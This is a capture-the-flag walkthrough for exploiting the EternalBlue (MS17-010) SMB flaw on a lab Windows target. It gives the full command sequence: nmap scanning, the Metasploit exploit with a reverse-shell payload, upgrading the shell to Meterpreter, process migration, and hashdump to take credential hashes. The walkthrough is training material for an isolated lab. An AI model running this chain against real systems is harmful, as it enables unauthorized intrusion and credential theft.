# 🔍 EternalBlue Exploitation Walkthrough

**Target IP:** `10.10.112.154`

---

## 🛰️ 1. Scanning the Target

### 🔎 Basic Service Scan

```bash
nmap -sV -Pn -vv 10.10.112.154

🧨 Vulnerability Scan

nmap -sV -sC --script vuln -oN blue.nmap 10.10.112.154

🚪 2. Gaining Access
🛠️ Launch Metasploit

msfconsole

🔍 Search for Vulnerability

search eternalblue

🧰 Use the Exploit (Usually #0)

use exploit/windows/smb/ms17_010_eternalblue

🎯 Set Target IP

set RHOST 10.10.112.154

💥 Set a Custom Payload (Optional, but cooler 😎)

set payload windows/x64/shell/reverse_tcp

    You can also list all available payloads:

show payloads

🔓 Run the Exploit

exploit

    💡 If it fails, reboot the target and try again!

🖥️ 3. Shell Management
🎉 On Success: You’re In!

<<<<<< WIN >>>>>>

🛑 Background the Session

CTRL + Z

🔁 4. Convert to Meterpreter
📚 Post Exploitation Module

use post/multi/manage/shell_to_meterpreter

⚙️ Configure the Module

show options
set session 1

    Check available sessions:

sessions

    If session 2 is created:

sessions -i 2

🔍 Check Access Level

getuid

🛡️ 5. Escalate Privileges
📋 View Running Services

![scan](Eternal_Blue_CTF/assets/image.png)

ps

    Look for services under NT AUTHORITY or similar with high privileges.

🔁 Migrate to High-Privilege Process

migrate <PROCESS_ID>

🔓 6. Crack the System
🧃 Dump Those Hashes

hashdump

    This will dump user credentials if privileges allow.

🧠 Bonus Tips

    If something fails, try again — persistence is key.

    Take notes on session numbers, process IDs, and UIDs.

    Happy Hacking 👾

    🧠 Educational use only. Don't be evil.
